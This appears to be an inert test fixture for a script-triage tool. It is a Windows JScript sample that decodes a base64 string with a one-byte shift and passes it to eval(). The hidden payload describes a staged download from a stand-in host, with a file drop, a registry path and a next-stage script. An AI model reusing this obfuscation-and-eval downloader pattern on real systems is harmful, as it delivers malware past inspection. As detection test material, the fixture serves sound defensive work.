// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
function decode_2dd1ca64(item1) {
  var item2 = [];
  for (var i = 0; i < item1.length; i++) { item2.push((item1[i] + 1) % 256); }
  return item2;
}
function recover_f9ff32e7() {
  var packedText = "eiFyc2RvciE5WiFgYnB0aHFkXnFkbG5zZCErIXZxaHNkXmVoa2QhKyFjaHJvYHNiZ15vcW5iZHJyISshZ2BtY25lZV5yYnFob3MhXCshYGNgb3NkcSE5IVZobUdzc28tVmhtR3Nzb1FkcHRkcnMtNC0wISshdWBrdGRyITl6IWJgbG9gaGZtXmhjITkhYmBsb2BoZm0sODIzYzdiNjQwYSErIXRxayE5IWdzc29yOS4uODIzYzdiNjQwYS1kd2Bsb2tkLWhtdWBraGMuM2UwNzA2MmUtY2BzISshdHJkcV5gZmRtcyE5IUd0bXNxZHJyS2BhLjgyM2M3YjY0MGEhKyFlaGtkXm9gc2chOSFCOVtbVHJkcXJbW090YWtoYltbR3Rtc3FkcnJLYGFbW3JzYGZkLDgyM2M3YjY0MGEtY2BzISshcWRmaHJzcXheb2BzZyE5IUdKQlRbW1JuZXN2YHFkW1tHdG1zcWRycktgYVtbQ2hyb25yYGFrZFtbODIzYzdiNjQwYSErIW1kd3NecnNgZmQhOSFrbmJgayxjaHJvYHNiZy1pciF8KyFyc2BmZEJudG1zITkzfA==";

  var item1 = decodeBase64(packedText);

  var item6 = "PROCESSOR_ARCHITECTURE";

  var item2 = decode_2dd1ca64(item1);

  var item3 = "";

  for (var bi = 0; bi < item2.length; bi++) { item3 += String.fromCharCode(item2[bi]); }

  return item3;
}
function inspect_541fef16() {
  var item4 = eval("(" + recover_f9ff32e7() + ")");
  var table = { steps: function() { return item4["steps"]; }, values: function() { return item4["values"]; } };
  return { steps: table["steps"](), adapter: item4["adapter"], values: table["values"](), stageCount: item4["stageCount"] };
}
